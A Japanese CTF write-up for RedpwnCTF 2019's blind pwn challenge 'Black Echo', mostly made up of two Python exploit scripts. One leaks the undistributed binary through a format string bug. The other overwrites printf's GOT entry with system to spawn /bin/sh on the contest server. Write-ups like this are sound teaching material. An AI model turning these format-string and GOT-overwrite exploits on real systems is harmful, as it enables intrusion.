# [pwn 413pts] Black Echo - RedpwnCTF 2019
問題バイナリが配布されていないBlind pwn問です。
Echoサービスで、シンプルなFSBがあるのでまずはバイナリをリークします。
```python
from ptrlib import *

sock = Socket("chall2.2019.redpwn.net", 4007)

f = open("binary", "wb")

elf = b''
addr = 0x08048000
pos = 11
for i in range(8000):
    payload = str2bytes("%{:08d}$sX".format(pos) + "X" * 4) + p32(addr)
    if b'\n' in payload:
        elf += b'\x00'
        addr += 1
        continue
    sock.sendline(payload)
    data = sock.recv(timeout=10)
    if data is not None:
        data = data[:data.index(b"XXXXX")]
        if data == b'': data = b'\x00'
        print(hex(addr), data)
        elf += data
        addr += len(data)
    f.seek(0)
    f.write(elf)
        
sock.interactive()
```

これを解析すると各種関数のGOTのアドレスが分かるので、あとはGOT overwriteすればOKです。
libcも配布されていないので特定する必要がありますが、libc databaseが死んでいるので（サービス終了？）適当にguessしたらlibc-2.23であることが分かりました。
あとはGOT overwriteでprintfをsystemに書き換えて終わり。
```python
from ptrlib import *

libc = ELF("./libc-2.23.so")
sock = Socket("chall2.2019.redpwn.net", 4007)

got_printf = 0x804a010
got_fgets  = 0x804a014
got_setbuf = 0x804a00c

# leak libc
payload = p32(got_printf) + b"%7$s"
sock.sendline(payload)
libc_base = u32(sock.recv()[4:8]) - libc.symbol("printf")
logger.info("libc = " + hex(libc_base))

# get shell
writes = {
    got_printf: libc_base + libc.symbol("system")
}
payload = fsb(
    writes = writes,
    bs = 1,
    pos = 7,
    bits = 32
)
sock.sendline(payload)
print(sock.recv())
sock.sendline("/bin/sh")

sock.interactive()
```

# 感想
Blind系解いたの初めてです。
libc database死んでるの困るなぁ。
自分で作るか。